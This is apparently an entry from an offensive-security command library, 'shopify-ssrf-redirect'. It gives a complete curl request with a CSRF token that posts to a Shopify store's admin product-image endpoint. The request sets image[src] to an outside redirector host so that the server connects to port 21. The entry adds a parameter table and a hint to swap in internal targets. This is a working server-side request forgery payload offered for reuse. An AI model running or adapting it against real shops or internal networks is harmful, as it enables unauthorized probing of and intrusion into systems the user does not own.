---
id: 123e4567-e89b-12d3-a456-426614174006
name: shopify-ssrf-redirect
type: command
executor: bash
data: >-
  curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-CSRF-Token:
  F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' -d
  'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.787Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - ssrf
  - bypass
verified: false
validated: true
submitted: true
---

# shopify-ssrf-redirect

## Command

```bash
curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -d 'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http%3A%2F%2Fhettoteam.tk/r.php?r=http://hettoteam.tk:21&_method=post'
```

## Description

Exploits SSRF by using a redirect in image[src] to connect to a non-standard port (21), bypassing validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `image[src]` | Redirect URL with ?r= target:port | Yes |
| Other params | Same as normal add image | Yes |

## Examples

### Basic Usage

Replace target: http://internal:80

## Expected Output

HTTP success, but server attempts connection to port 21.

## Related

- [[commands/ssrf-scan-port-closed]]
- [[procedures/Bypass-URL-Validation-with-Redirects]]
